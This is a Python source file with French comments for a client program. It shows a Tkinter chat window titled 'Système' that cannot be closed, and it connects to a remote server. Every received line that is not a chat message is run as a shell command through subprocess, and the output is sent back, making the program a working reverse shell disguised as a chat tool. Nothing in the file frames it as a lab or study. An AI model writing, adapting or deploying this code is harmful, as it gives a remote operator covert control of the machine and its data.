import socket
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext
import queue
from datetime import datetime

class ClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Système")
        self.root.geometry("400x300")
        
        # Empêcher la fermeture de la fenêtre
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Frame principale
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Zone de messages
        self.chat_text = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD)
        self.chat_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.chat_text.config(state=tk.DISABLED)
        
        # Zone de saisie
        input_frame = ttk.Frame(main_frame)
        input_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Label pour indiquer où répondre
        self.input_label = ttk.Label(input_frame, text="Répondre :")
        self.input_label.pack(side=tk.LEFT, padx=(0, 5))
        
        self.chat_entry = ttk.Entry(input_frame)
        self.chat_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.chat_entry.bind('<Return>', self.send_message)
        
        send_button = ttk.Button(input_frame, text="Envoyer", command=self.send_message)
        send_button.pack(side=tk.RIGHT)
        
        # Indicateur de notification
        self.notification_label = ttk.Label(self.root, text="●", foreground="red")
        self.notification_label.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)
        self.notification_label.pack_forget()
        
        self.sock = None
        self.message_queue = queue.Queue()
        self.running = True

    def on_closing(self):
        # Empêcher la fermeture de la fenêtre
        pass

    def process_messages(self):
        while self.running:
            try:
                message = self.message_queue.get(timeout=0.1)
                if message.startswith("msg "):
                    # Afficher le message dans la zone de chat
                    self.chat_text.config(state=tk.NORMAL)
                    self.chat_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Serveur: {message[4:]}\n")
                    self.chat_text.see(tk.END)
                    self.chat_text.config(state=tk.DISABLED)
                    # Afficher la notification
                    self.notification_label.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)
                    # Mettre la fenêtre au premier plan
                    self.root.lift()
                    self.root.focus_force()
                    # Mettre le focus sur la zone de saisie
                    self.chat_entry.focus_set()
            except queue.Empty:
                continue

    def send_message(self, event=None):
        message = self.chat_entry.get()
        if message and self.sock:
            try:
                self.sock.send(f"[RESPONSE]{message}".encode())
                self.chat_text.config(state=tk.NORMAL)
                self.chat_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Vous: {message}\n")
                self.chat_text.see(tk.END)
                self.chat_text.config(state=tk.DISABLED)
                self.chat_entry.delete(0, tk.END)
            except:
                pass

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()

class ClientThread(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.running = True
        
        # Créer la fenêtre principale
        self.root = tk.Tk()
        self.gui = ClientGUI(self.root)

    def run(self):
        try:
            # Créer et connecter la socket
            self.gui.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.gui.sock.connect((self.host, self.port))
            print(f"[+] Connecté au serveur {self.host}:{self.port}")

            # Démarrer le thread de traitement des messages
            self.gui.process_message_thread = threading.Thread(target=self.gui.process_messages, daemon=True)
            self.gui.process_message_thread.start()

            # Boucle principale de réception des commandes
            while self.running:
                try:
                    command = self.gui.sock.recv(20240)
                    if not command:
                        print("[*] Connexion fermée par le serveur.")
                        break

                    command = command.decode()

                    if command.lower() == "exit":
                        print("[*] Commande de déconnexion reçue, fermeture client.")
                        self.running = False
                        break

                    if command.startswith("msg "):
                        self.gui.message_queue.put(command)
                        continue

                    output = self.execute_command(command)
                    self.gui.sock.send(output.encode())

                except Exception as e:
                    print(f"[!] Erreur : {e}")
                    break

        except Exception as e:
            print(f"[!] Erreur : {e}")
        finally:
            self.gui.stop()
            print("[*] Connexion fermée.")

    def execute_command(self, command):
        try:
            result = subprocess.getoutput(command)
            return result if result else "[*] Commande exécutée sans sortie."
        except Exception as e:
            return f"[!] Erreur d'exécution : {str(e)}"

    def start(self):
        super().start()
        # Démarrer la boucle principale de Tkinter
        self.root.mainloop()
